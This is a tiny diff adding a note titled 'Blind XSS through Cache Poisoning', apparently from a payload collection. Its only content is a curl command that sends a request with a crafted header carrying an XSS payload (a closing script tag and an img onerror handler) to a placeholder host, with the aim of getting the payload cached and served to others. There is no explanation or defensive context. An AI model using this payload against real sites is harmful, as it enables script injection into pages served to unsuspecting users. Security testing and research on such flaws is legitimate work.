@@ -1,0 +1,3 @@
+#Blind XSS through Cache Poisoning
+
+curl -H “User-Agent: tester” -H “hidden-header: </script><h2>TESTERING2333<img src=x onerror=alert(document.domain)>” https://webhook.com/
